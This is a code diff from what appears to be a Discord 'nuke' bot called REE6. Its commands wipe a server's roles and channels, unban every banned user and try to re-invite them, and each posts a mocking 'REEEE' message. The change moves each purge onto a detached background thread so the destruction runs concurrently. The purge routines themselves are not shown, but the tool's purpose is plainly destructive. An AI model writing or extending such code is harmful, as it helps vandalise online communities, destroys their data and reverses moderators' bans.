@@ -32,14 +32,11 @@ namespace REE6
         {
             await ReplyAsync("Purging everything...");
             await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
-            System.Threading.Thread thread = new System.Threading.Thread(delegate() {
+            new System.Threading.Thread(delegate() {
                 Task.Run(() => PurgeActions.RolePurge(Context.Guild));
                 Task.Run(() => PurgeActions.ChannelPurge(Context.Guild));
                 Task.Run(() => PurgeActions.Unban(Context.Guild)); 
-            });
-
-            thread.IsBackground = true;
-            thread.Start();
+            }).Start();
         }
 
         [Command("roles")]
@@ -47,7 +44,9 @@ namespace REE6
         {
             await ReplyAsync("Purging roles...");
             await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
-            await PurgeActions.RolePurge(Context.Guild);
+            new System.Threading.Thread(delegate () {
+                Task.Run(() => PurgeActions.RolePurge(Context.Guild));
+            }).Start();
         }
 
         [Command("channels")]
@@ -55,7 +54,9 @@ namespace REE6
         {
             await ReplyAsync("Purging channels...");
             await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
-            await PurgeActions.ChannelPurge(Context.Guild);
+            new System.Threading.Thread(delegate () {
+                Task.Run(() => PurgeActions.ChannelPurge(Context.Guild));
+            }).Start();
         }
 
         [Command("bans")]
@@ -63,7 +64,9 @@ namespace REE6
         {
             await ReplyAsync("Unbanning and attempting to invite " + Context.Guild.GetBansAsync().Result.Count + " people");
             await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
-            await PurgeActions.Unban(Context.Guild);
+            new System.Threading.Thread(delegate () {
+                Task.Run(() => PurgeActions.Unban(Context.Guild));
+            }).Start();
         }
     }
 }
